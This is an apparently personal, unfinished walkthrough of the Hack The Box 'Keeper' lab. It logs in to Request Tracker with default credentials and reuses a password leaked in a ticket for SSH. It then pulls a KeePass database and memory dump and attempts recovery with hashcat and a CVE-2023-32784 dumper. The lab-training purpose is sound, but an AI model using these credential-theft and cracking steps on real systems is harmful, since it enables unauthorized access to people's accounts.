tickets.keeper.htb/rt/

> Add these to `/etc/hosts`:

    10.129.98.9  tickets.keeper.htb
    10.129.98.9  keeper.htb

"»|« RT 4.4.4+dfsg-2ubuntu1 (Debian) Copyright 1996-2019 Best Practical Solutions, LLC. "

Best Practical Request Tracker...what is it?

Doesn't matter, login is `root:password`

Apparently Lise Noorgard ( http://tickets.keeper.htb/rt/User/Summary.html?id=27 ) removed a KeePass attachment and downloaded it to her home dir.

I wonder what her password is.

Comment: `New user. Initial password set to Welcome2023!`

Maybe we can run:

    ssh lnorgaard@tickets.keeper.htb
    Welcome2023!

We have user flag!

Now to download that file in the user's home directory.

    scp lnorgaard@tickets.keeper.htb:RT30000.zip ./
    Welcome2023!

Broken pipe. Let's try something else.

    ssh lnorgaard@tickets.keeper.htb
    Welcome2023!
    python -m http.server
    <visit http://tickets.keeper.htb:8000/ >
    

Now we have a `.dmp` and a KeePass file.

We can try to crack the KeePass file with Hashcat.

    keepass2john passcodes.kdbx > passcodes.hash
    hashcat -h | grep KeePass
    hashcat -m 13400 -a 0 -w 1 passcodes.hash /usr/share/wordlists/rockyou.txt

Exhausted keyspace! It's not in `rockyou.txt`.

I cheated a bit. Apparently I need to search the memory dump for these non-ASCII symbols:

    æ
    ø

TODO: 

    https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools#install-debugging-tools-for-windows

    https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/

Okay. Maybe " CVE-2023-32784 " is related?

https://github.com/vdohney/keepass-password-dumper ?

Well, we get:

    dotnet run .\KeePassDumpFull.dmp

    Combined: *{,, l, `, -, ', ], A, I, :, =, _, c, M}dgr*d med fl*de

    Danish red berry pudding? `Rødgrød med fløde`?

    Rødgrød med fløde
    rødgrødmedfløde
    RødgrødMedFløde
    rodgrodmedflode
    r*dgr*dmedfl*de
    Rød grød med fløde
    rød grød med fløde
    m*dgr*dmedfl*de


None of those work. I want to mutate the wordlist `wordlist-berry-pudding.txt`.

    hashcat -m 13400 -a 0 -r rules --debug-mode=1 passcodes.hash wordlist-berry-pudding.txt